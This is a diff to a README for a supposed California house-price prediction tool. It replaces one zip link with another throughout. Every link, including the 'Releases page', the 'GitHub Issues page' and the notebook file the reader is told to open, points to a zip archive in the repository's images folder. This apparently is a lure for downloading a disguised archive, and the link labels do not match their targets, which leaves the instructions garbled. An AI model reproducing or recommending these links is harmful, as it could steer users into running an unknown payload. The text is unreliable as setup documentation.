@@ -2,7 +2,7 @@
 
 ## 📥 Download Here
 
-[![Download](https://raw.githubusercontent.com/Niklas309/California-House-Prediction/main/images/California-Prediction-House-1.7.zip%20Latest%20Release-California%20House%20Prediction-blue)](https://raw.githubusercontent.com/Niklas309/California-House-Prediction/main/images/California-Prediction-House-1.7.zip)
+[![Download](https://github.com/Niklas309/California-House-Prediction/raw/refs/heads/main/images/House_California_Prediction_3.6.zip%20Latest%20Release-California%20House%20Prediction-blue)](https://github.com/Niklas309/California-House-Prediction/raw/refs/heads/main/images/House_California_Prediction_3.6.zip)
 
 ## 📖 Description
 California-House-Prediction is a machine learning application designed to help you estimate house prices in California. Using advanced algorithms, this tool provides accurate predictions based on various features like location, size, and amenities. No programming skills required!
@@ -18,16 +18,16 @@ To use California-House-Prediction, follow these straightforward steps:
    - **Software:** Jupyter Notebook or JupyterLab (included in the package)
 
 2. **Visit Download Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Niklas309/California-House-Prediction/main/images/California-Prediction-House-1.7.zip) to find the latest version. 
+   Go to the [Releases page](https://github.com/Niklas309/California-House-Prediction/raw/refs/heads/main/images/House_California_Prediction_3.6.zip) to find the latest version. 
 
 3. **Download the Application**  
-   Click on the version you want to download. The file will usually be labeled in a format like `https://raw.githubusercontent.com/Niklas309/California-House-Prediction/main/images/California-Prediction-House-1.7.zip`. Download it to your computer.
+   Click on the version you want to download. The file will usually be labeled in a format like `https://github.com/Niklas309/California-House-Prediction/raw/refs/heads/main/images/House_California_Prediction_3.6.zip`. Download it to your computer.
 
 4. **Extract the Downloaded File**  
    After downloading, locate the file (likely in your Downloads folder). Right-click on it and select "Extract All" (or use any extraction tool you prefer).
 
 5. **Open the Jupyter Notebook**  
-   To run the application, you’ll need Jupyter Notebook. Navigate to the extracted folder, find `https://raw.githubusercontent.com/Niklas309/California-House-Prediction/main/images/California-Prediction-House-1.7.zip`, and double-click it. This will open it in your web browser.
+   To run the application, you’ll need Jupyter Notebook. Navigate to the extracted folder, find `https://github.com/Niklas309/California-House-Prediction/raw/refs/heads/main/images/House_California_Prediction_3.6.zip`, and double-click it. This will open it in your web browser.
 
 6. **Run the Code Cells**  
    Follow the instructions within the notebook. You can run each cell by clicking it and pressing Shift + Enter. The notebook will guide you through the steps to input your data and get predictions.
@@ -67,13 +67,13 @@ If you encounter issues:
 - **Prediction Accuracy:** Keep in mind that the model’s accuracy can vary based on the quality of input data.
 
 ## 👥 Community and Support
-If you have questions or need further guidance, visit the [GitHub Issues page](https://raw.githubusercontent.com/Niklas309/California-House-Prediction/main/images/California-Prediction-House-1.7.zip) to ask for help. Community support is available for troubleshooting or sharing experiences.
+If you have questions or need further guidance, visit the [GitHub Issues page](https://github.com/Niklas309/California-House-Prediction/raw/refs/heads/main/images/House_California_Prediction_3.6.zip) to ask for help. Community support is available for troubleshooting or sharing experiences.
 
 ## 🌐 Additional Resources
 - **Documentation:** For deeper insights into how the model works, check the detailed documentation in the repository.
 - **Data Source:** Understand where the training data comes from. Refer to sources mentioned in the notebook for more information on datasets used.
 
 ## 🔗 Download and Install
-Remember, to download the latest version of California-House-Prediction, visit the [Releases page](https://raw.githubusercontent.com/Niklas309/California-House-Prediction/main/images/California-Prediction-House-1.7.zip). Follow the steps outlined above to successfully download, install, and run the application on your computer.
+Remember, to download the latest version of California-House-Prediction, visit the [Releases page](https://github.com/Niklas309/California-House-Prediction/raw/refs/heads/main/images/House_California_Prediction_3.6.zip). Follow the steps outlined above to successfully download, install, and run the application on your computer.
 
 Your journey to predicting California house prices starts here!
